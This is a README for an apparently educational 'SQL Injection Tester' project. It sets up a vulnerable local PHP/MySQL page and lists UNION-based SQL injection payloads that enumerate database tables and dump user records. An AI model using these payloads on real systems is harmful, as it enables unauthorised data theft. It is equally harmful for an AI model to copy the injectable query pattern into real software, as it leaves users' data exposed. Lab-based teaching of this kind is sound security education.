<b> SQL Injection Tester </b>


Steps to Implement this program:- ( For Windows users)

1. Git-Clone these 2 files (project.html andd projectdb.php).

2. Download xampp server or wampp server (or any other server where you want to execute html and php file).

3. Start mysql and apache services in server.

4. Create mysql database in php-my-admin with name "project",further in this database create a table with name "users" 
   then you need to insert some random records in the table.

5. Run that file (project.html) through server.

6. Test the basic functionality of this program by typing "srno"(serial number) in text field, 
   if the output is showing the details of that "srno" then the basic functionality  is working correctly.

7. Now, let's test sql injection:-
  
   Type " a' " in text field, if output is  showing a sql error then this page is sql injected 
    and can be hackable.
    
    <img src = "screenshots/Screenshot from 2019-10-03 00-17-35.png" height = 500 width  = 900/>
    
    Output:-
    
    <img src = "screenshots/Screenshot from 2019-10-03 00-17-59.png" height = 500 width  = 900/>
    
   Now type some queries given below:-

   1. a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables;#
   
   <img src = "screenshots/Screenshot from 2019-10-03 00-29-45.png" height = 500 width  = 900/>
   
   Output:-
     <img src = "screenshots/Screenshot from 2019-10-03 00-30-45.png" height = 500 width  = 900/>

   2. a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables 
      where table_name like 'user%';#
      
        <img src = "screenshots/Screenshot from 2019-10-03 00-31-57.png" height = 500 width  = 900/>
        
        Output:-
          <img src = "screenshots/Screenshot from 2019-10-03 00-32-01.png" height = 500 width  = 900/>
     

   3. a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#
   
     <img src = "screenshots/Screenshot from 2019-10-03 00-34-12.png" height = 500 width  = 900/>
     
     Output:-
      <img src = "screenshots/Screenshot from 2019-10-03 00-34-16.png" height = 500 width  = 900/>


Steps to Implement this program:- ( For Linux users):-

Setting up LAMP(Linux, Apache, Mysql, PHP):-

1- If you have a Linux OS then you have already done the first phase of LAMP which is linux.

2- Further, you have to install :-
  -Apache
  Command - apt-get install apache2
  -Mysql
  Command - apt-get install mysql -server
  -pHp
  Command - apt-get install php7.2 libapache-mod-php7.2php-mysql
  -pHp-my-admin
  Command - apt-get install phpmyadmin

3- Now ,you have to follow some mysql commands:-
  -Create database:-
    Create database project;
  -Select the created database:-
    use project;
  -Create table in database:-
    create table users(srno int(5) primary key, name  varchar(30), city varchar(30));

4- Now git-clone those 2 pages(project.html and projectdb.php) and copy them at following path:-
   var/www/html

5- Now run project.html in browser (localhost/project.html) 

6-  Now, let's test sql injection:-
  
  - Type " a' " in text field, if output is  showing a sql error then this page is sql injected 
    and can be hackable.
  - Now type some queries given below:-

   1. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables;#

   2. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables 
      where table_name like 'user%';#

   3. a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#
    
